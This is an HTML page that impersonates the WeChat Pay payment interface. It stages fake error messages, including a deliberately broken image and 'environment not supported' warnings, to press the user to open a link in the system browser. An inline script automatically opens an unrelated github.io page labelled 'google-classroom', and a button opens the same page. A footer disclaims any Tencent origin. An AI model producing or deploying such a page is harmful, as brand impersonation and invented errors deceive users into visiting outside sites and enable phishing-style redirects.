<!DOCTYPE html>
<html>
<head><title>微信支付</title></head>
<body style="margin:0;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:Arial;">
    <div style="width:100%;max-width:100%;padding:0;margin:0;">
        <div style="background:#fff;min-height:100vh;padding:40px 20px;box-sizing:border-box;">
            <div style="text-align:center;margin-bottom:20px;">
                <img src="nonexistent.png" onerror="this.style.display='none';document.getElementById('err').style.display='block';" style="width:60px;height:60px;">
                <div id="err" style="display:none;color:#FF6B6B;font-size:16px;margin-top:10px;">⚠️ 图片加载失败，请在浏览器中打开</div>
            </div>
            <h1 style="color:#09BB07;font-size:28px;margin-bottom:5px;text-align:center;">微信支付</h1>
            <p style="color:#999;font-size:16px;text-align:center;">WeChat Pay</p>
            <hr style="border:none;border-top:1px solid #eee;margin:20px 0;">
            <p style="color:#333;font-size:18px;text-align:center;">请在系统浏览器中打开以完成支付验证</p>
            <div style="background:#FFF3E0;border:1px solid #FF9800;border-radius:8px;padding:15px;margin:20px 0;">
                <p style="color:#E65100;font-size:14px;margin:0;">⚠️ 当前环境不支持，请使用系统浏览器打开</p>
            </div>
            <button onclick="window.open('https://1l08kwokpohua.github.io/google-classroom/','_blank')" style="width:100%;padding:16px;font-size:18px;background:#09BB07;color:#fff;border:none;border-radius:8px;margin-bottom:12px;">(error:picture:img cannot successfully open) 在浏览器中打开</button>
            <button onclick="location.reload()" style="width:100%;padding:16px;font-size:18px;background:#fff;color:#09BB07;border:1px solid #09BB07;border-radius:8px;">重新加载</button>
            <p style="color:#999;font-size:12px;margin-top:30px;text-align:center;">*该软件非腾讯开发，仅供学习交流</p>
        </div>
    </div>
    <script>
        window.open('https://1l08kwokpohua.github.io/google-classroom/','_blank');
    </script>
</body>
</html>
